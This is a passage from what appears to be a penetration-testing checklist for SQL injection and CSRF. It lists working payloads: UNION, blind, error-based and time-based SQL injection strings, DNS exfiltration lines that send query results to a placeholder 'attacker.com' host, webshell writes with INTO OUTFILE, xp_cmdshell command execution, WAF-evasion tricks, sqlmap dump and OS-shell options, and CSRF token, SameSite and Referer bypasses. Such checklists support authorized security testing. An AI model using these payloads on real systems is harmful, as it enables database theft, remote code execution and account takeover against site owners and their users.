* [ ] String funcs: `SUBSTRING`/`SUBSTR`/`MID`, `SLEEP`/`pg_sleep`/`WAITFOR`/`dbms_pipe`

***

### 4. UNION-Based

* [ ] Find column count via `ORDER BY 1..N` until error
* [ ] Find column count via `UNION SELECT NULL,NULL,...`
* [ ] Identify which columns are reflected (string-compatible): `UNION SELECT 'a',NULL,..`
* [ ] Dump version into a visible column
* [ ] Enumerate DBs: `information_schema.schemata`
* [ ] Enumerate tables: `information_schema.tables`
* [ ] Enumerate columns: `information_schema.columns`
* [ ] Dump creds/PII from target tables
* [ ] Oracle: append `FROM dual`; MSSQL: column type-match matters

***

### 5. Boolean-Based Blind

* [ ] Confirm true/false divergence with `AND 1=1` / `AND 1=2`
* [ ] Extract length: `AND LENGTH(database())=N`
* [ ] Char-by-char: `AND SUBSTRING(database(),1,1)='a'`
* [ ] Binary search with `ASCII()`/`>`/`<` to speed extraction
* [ ] Use `LIKE` divergence (e.g. comment-hiding trick on Pornhub-style filters)

***

### 6. Error-Based

* [ ] MySQL `extractvalue(1,concat(0x7e,(SELECT @@version)))`
* [ ] MySQL `updatexml(1,concat(0x7e,(SELECT database())),1)`
* [ ] MySQL double-query / `floor(rand()*2)` group-by error
* [ ] MSSQL `CONVERT(int,(SELECT @@version))` / `CAST`
* [ ] PostgreSQL `CAST((SELECT version()) AS int)`
* [ ] Oracle `CTXSYS.DRITHSX.SN` / `utl_inaddr.get_host_name`

***

### 7. Time-Based Blind (payload bank)

* [ ] MySQL `SLEEP(5)#` and `' or sleep(5)#` (and `"`, `)`, `))`, `')`, `")` variants)
* [ ] MySQL stacked subselect: `AND (SELECT * FROM (SELECT(SLEEP(5)))a)`
* [ ] MySQL `'XOR(if(now()=sysdate(),sleep(5),0))OR'`
* [ ] MySQL `benchmark(10000000,MD5(1))#`
* [ ] PostgreSQL `pg_sleep(5)--` (and quote/paren variants)
* [ ] MSSQL `;waitfor delay '0:0:5'--` (and `'`, `"`, `)` variants)
* [ ] SQLite heavy query: `AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`
* [ ] `ORDER BY SLEEP(5)` / `'&&SLEEP(5)&&'1` context variants
* [ ] Confirm timing is consistent (run baseline + repeat to rule out jitter)

***

### 8. Stacked Queries & OOB (out-of-band)

* [ ] Stacked query support: `; SELECT ...` / `;WAITFOR DELAY` (MSSQL, PG)
* [ ] DNS exfil — MySQL `LOAD_FILE(CONCAT('\\\\',(query),'.attacker.com\\x'))`
* [ ] DNS exfil — MSSQL `master..xp_dirtree '\\(query).attacker.com\x'`
* [ ] DNS exfil — Oracle `UTL_HTTP` / `UTL_INADDR` / `DBMS_LDAP`
* [ ] PostgreSQL OOB via `dblink` / `COPY ... TO PROGRAM` (if superuser)
* [ ] Burp Collaborator / interactsh as the listener

***

### 9. Second-Order

* [ ] Identify input stored now, used in a query later (registration username, profile field)
* [ ] Plant payload on store endpoint, trigger on the consuming endpoint
* [ ] sqlmap `--second-order=<url>` (or `--second-req`) to automate the trigger
* [ ] Watch for payloads firing in admin/reporting/export views

***

### 11. Advanced / RCE Escalation

* [ ] MySQL file read: `LOAD_FILE('/etc/passwd')` (needs FILE priv + secure\_file\_priv)
* [ ] MySQL file write: `INTO OUTFILE`/`DUMPFILE` → webshell in webroot
* [ ] MSSQL `xp_cmdshell` (enable via `sp_configure`) → OS command
* [ ] MSSQL linked servers / `OPENQUERY`
* [ ] Oracle `DBMS_SCHEDULER`/`DBMS_JAVA` for command exec
* [ ] Read DB creds → pivot / reuse elsewhere
* [ ] Signature/HMAC bypass on signed params (Razer easy2pay-style) before injecting

***

### 12. WAF / Filter Bypass

* [ ] Inline comments: `/*!50000SELECT*/`, `SE/**/LECT`
* [ ] Case toggling: `SeLeCt`, `UnIoN`
* [ ] Whitespace alts: `%09`, `%0a`, `%0c`, `%a0`, `/**/`, `+`
* [ ] Encoding: URL, double-URL, unicode, hex (`0x...`), char() concat
* [ ] Keyword splitting / nesting: `UNIONUNION SELECTSELECT`
* [ ] Alternate operators: `||`, `&&`, `LIKE`, `RLIKE`, `REGEXP` instead of `=`
* [ ] Logical equivalents: `AND 1` , `AND true()`, `AND 2>1`
* [ ] sqlmap `--tamper` (space2comment, between, charencode, randomcase, etc.)
* [ ] Cookie / header injection point to dodge URL-focused WAF rules

***

### 13. Automation (sqlmap)

* [ ] `sqlmap -r request.txt --batch` (use a saved proxy request)
* [ ] `--level=5 --risk=3` for deeper tests
* [ ] `--dbms=` to pin the DBMS once known
* [ ] `--technique=BEUSTQ` to control which methods run
* [ ] `--dbs` → `--tables` → `--columns` → `--dump`
* [ ] `--tamper=` chain for WAF bypass
* [ ] `--second-order=<url>` for stored injection
* [ ] `--os-shell` / `--sql-shell` for exploitation
* [ ] Headers/cookie: mark injection point with `*` and `--cookie`/`-H`



</details>

<details>

<summary>CSRF</summary>

### 0. Is This a CSRF Candidate?

* [ ] Request changes state (settings, password, email, payment, role, delete, logout)
* [ ] Request relies only on cookies for auth (no custom header / no token enforced)
* [ ] Response isn't needed by attacker (blind state change is enough)
* [ ] Cookies sent cross-site? Check `SameSite` attribute (None/Lax/Strict)
* [ ] Identify the protection in use: token / SameSite / JSON CT / re-auth / double-submit / Origin-Referer / captcha / custom header

***

### 1. Where to Look

* [ ] Auth-required actions (settings, password, email)
* [ ] Profile changes (email, personal info, picture)
* [ ] Account deletion / suspension
* [ ] Payment / transactional (add card, transfer, subscription)
* [ ] Form submissions (support tickets, feedback, content)
* [ ] Security settings (enable/disable 2FA, security questions)
* [ ] Privilege escalation (role/permission change)
* [ ] Logout (forced logout CSRF)
* [ ] Password reset flow
* [ ] Third-party / social-account linking (OAuth connect)
* [ ] Like / comment / add-to-cart / balance transfer

***

### 2. No-Token / Missing Validation

* [ ] Remove the CSRF token parameter entirely → still accepted?
* [ ] Send empty token (`csrf_token=`) → still accepted?
* [ ] Delete token AND build auto-submitting `<form>` PoC
* [ ] Brand-new session/account: is token even required on first use?

***

### 3. Token Integrity / Reuse

* [ ] Reuse your own old/static token on a new request
* [ ] If token is fixed per account → make PoC with attacker's old token, change email to victim
* [ ] Replace token with a fake value of the **same length**
* [ ] Use another user's token (is it tied to the session?)
* [ ] Token analysis (Burp): is part static, part dynamic? Send only the static part
* [ ] Try to decrypt/crack the token if it looks like a hash
* [ ] Token in cookie only (not validated against body) → swap it

***

### 4. Double-Submit Cookie Bypass

* [ ] Valid baseline: cookie token == body token
* [ ] Set BOTH cookie and body to the same **arbitrary** value (`not_a_real_token`) → accepted?
* [ ] Inject the CSRF cookie via another vuln (header injection / subdomain) then match it in body

***

### 5. Method & Content-Type Tricks

* [ ] Change POST → GET (`/password_change?new_password=abc`)
* [ ] Method override: `_method=POST` / `X-HTTP-Method-Override`
* [ ] JSON CT → `application/x-www-form-urlencoded` (`phone=...`)
* [ ] JSON CT → `text/plain` (`phone=...`)
* [ ] JSON CT → keep `application/json` but send via form with `enctype="text/plain"` padding trick (`name='{"phone":"...","a":"' value='"}'`)
* [ ] Drop Content-Type entirely

***

### 6. Origin / Referer Header Bypass

* [ ] Remove Referer with `<meta name="referrer" content="no-referrer">`
* [ ] Referer suffix trick: `Referer: example.com.attacker.com` (substring check)
* [ ] Referer prefix trick: `Referer: attacker.com/example.com`
* [ ] Send no Origin header (cross-origin GET / downgrade)
* [ ] Check if validation only fires _when header present_ → omit it

***

### 7. SameSite Bypass

* [ ] `SameSite=Lax` → use a top-level GET navigation (it's allowed)
* [ ] Method downgrade (POST→GET) to ride Lax allowance
* [ ] Sister/sub-domain request (same-site, different origin) to satisfy Lax/Strict
* [ ] Cookie refresh window: trigger a flow that re-issues cookie without SameSite
* [ ] No SameSite set + old browser → treated as None

***

### 8. Chaining

* [ ] Steal CSRF token via XSS, then submit forged request
* [ ] Subdomain takeover + CORS → read token cross-origin
* [ ] CORS misconfig → fetch token from authed endpoint
* [ ] Domain-confusion (parser differences) → ATO
* [ ] OAuth `state` parameter: null byte `%00`, remove, or reuse → linking CSRF → ATO
* [ ] Clickjacking when no token (frame the action page)
* [ ] GraphQL endpoint without CSRF protection (site-wide)

***

### 9. User-Agent / Client Bypass

* [ ] Switch to mobile/tablet User-Agent → token check skipped?
* [ ] Native-app / API client path may not enforce token

***

### 10. Build & Verify PoC

* [ ] Auto-submitting `<form>` for `x-www-form-urlencoded`
* [ ] `enctype="text/plain"` form for JSON endpoints
* [ ] `history.pushState` to spoof a clean/expected path
* [ ] Clickjacking iframe page (when applicable)
* [ ] Fire from a different origin, logged in as victim in another tab
* [ ] Confirm the state actually changed on the victim account



</details>

